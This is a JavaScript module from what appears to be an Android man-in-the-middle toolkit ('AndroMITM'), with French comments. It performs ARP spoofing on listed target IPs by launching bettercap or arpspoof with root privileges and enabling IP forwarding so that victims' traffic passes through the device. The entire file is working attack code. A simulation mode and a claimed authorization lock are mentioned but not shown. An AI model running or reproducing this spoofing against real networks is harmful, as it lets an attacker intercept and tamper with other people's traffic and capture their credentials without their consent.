/**
 * AndroMITM — modules/arpspoof.js
 * Spoofing ARP : bettercap (recommandé) ou arpspoof (dsniff).
 * Active ip_forward au démarrage, le restaure à l'arrêt.
 * ⚠ MODULE D'ATTAQUE — verrouillé sans déclaration d'autorisation + root requis.
 */
'use strict';

const { ModuleBase } = require('./base');
const fs = require('fs');

class ArpSpoofModule extends ModuleBase {
  constructor() {
    super('arp', {
      requires: [
        { tool: 'bettercap', reason: 'moteur MITM complet (recommandé)' },
        { tool: 'arpspoof', reason: 'repli minimal dsniff (optionnel)' },
      ],
      needsRoot: true,
      attackModule: true,
    });
    this.backend = null; // 'bettercap' | 'arpspoof'
    this.ipForwardWasOn = false;
    this.targets = [];
    this.iface = null;
  }

  runtimeInfo() { return { backend: this.backend, targets: this.targets, iface: this.iface, ipForward: this.ipForwardWasOn }; }
  safeCfg(cfg) { return { iface: cfg.iface, targets: cfg.targets, gateway: cfg.gateway, fullDuplex: !!cfg.fullDuplex }; }

  onStart(cfg) {
    const { SIM, whichTool, privileged } = this.ctx;
    this.iface = cfg.iface || 'wlan0';
    this.targets = Array.isArray(cfg.targets) ? cfg.targets : String(cfg.targets || '').split(',').map((s) => s.trim()).filter(Boolean);
    if (!this.targets.length) throw new Error('aucune cible ARP définie (cfg.targets = ["192.168.1.10", ...])');
    this.gateway = cfg.gateway || this.detectGateway();

    // 1) ip_forward ON (sauvegarder l'état initial)
    this.ipForwardWasOn = this.readIpForward();
    if (!this.ipForwardWasOn) this.writeIpForward(true);

    if (SIM) {
      this.backend = 'simulation';
      this.simTimer = setInterval(() => {
        this.emit('info', 'arp.packet', { iface: this.iface, targets: this.targets, gateway: this.gateway, sim: true });
      }, 3000);
      return;
    }

    if (whichTool('bettercap')) {
      this.backend = 'bettercap';
      const evalStr = [
        `set arp.spoof.targets ${this.targets.join(',')}`,
        this.gateway ? `set arp.spoof.internal ${cfg.fullDuplex ? 'true' : 'false'}` : '',
        'arp.spoof on',
      ].filter(Boolean).join('; ');
      const { cmd, args } = privileged('bettercap', ['-iface', this.iface, '-eval', evalStr]);
      this.ctx.startProcess('arp', cmd, args, {
        onLine: (line, isErr) => this.emit(isErr ? 'info' : 'info', 'arp.raw', { line }),
        onExit: (code) => { if (this.state === 'running') this.emit('warn', 'arp.exited', { code }); },
      });
    } else if (whichTool('arpspoof')) {
      this.backend = 'arpspoof';
      const { cmd, args } = privileged('arpspoof', ['-i', this.iface, ...(cfg.fullDuplex ? [] : ['-t', this.targets[0]]), this.gateway]);
      this.ctx.startProcess('arp', cmd, args, {
        onLine: (line) => this.emit('info', 'arp.raw', { line }),
        onExit: (code) => { if (this.state === 'running') this.emit('warn', 'arp.exited', { code }); },
      });
    } else {
      throw new Error('ni bettercap ni arpspoof disponibles — installer via scripts/install-termux.sh');
    }
  }

  onStop() {
    const { SIM, whichTool, privileged } = this.ctx;
    if (this.simTimer) { clearInterval(this.simTimer); this.simTimer = null; }
    this.ctx.stopProcess('arp');
    if (!SIM && whichTool('bettercap')) {
      // tentative d'arrêt propre côté bettercap si encore vivant
      try {
        const { cmd, args } = privileged('bettercap', ['-iface', this.iface, '-eval', 'arp.spoof off']);
        require('child_process').execFile(cmd, args, { timeout: 5000 }, () => {});
      } catch (_) { /* ignore */ }
    }
    // restaurer ip_forward
    if (this.ipForwardWasOn === false) this.writeIpForward(false);
  }

  detectGateway() {
    try {
      const route = fs.readFileSync('/proc/net/route', 'utf8').split('\n').slice(1);
      for (const line of route) {
        const cols = line.trim().split(/\s+/);
        if (cols.length >= 4 && cols[1] === '00000000') {
          const hex = cols[2].match(/../g).reverse().join('');
          return hex.match(/../g).map((b) => parseInt(b, 16)).join('.');
        }
      }
    } catch (_) { /* ignore */ }
    return null;
  }

  readIpForward() {
    try { return fs.readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim() === '1'; }
    catch (_) { return false; }
  }

  writeIpForward(on) {
    const { SIM, privileged } = this.ctx;
    if (SIM) return;
    try {
      const { cmd, args } = privileged('sh', ['-c', `echo ${on ? 1 : 0} > /proc/sys/net/ipv4/ip_forward`]);
      require('child_process').execFileSync(cmd, args, { timeout: 5000 });
      this.emit('info', 'arp.ip_forward', { enabled: on });
    } catch (e) {
      this.emit('warn', 'arp.ip_forward-fail', { message: String(e.message || e) });
    }
  }
}

module.exports = { ArpSpoofModule };
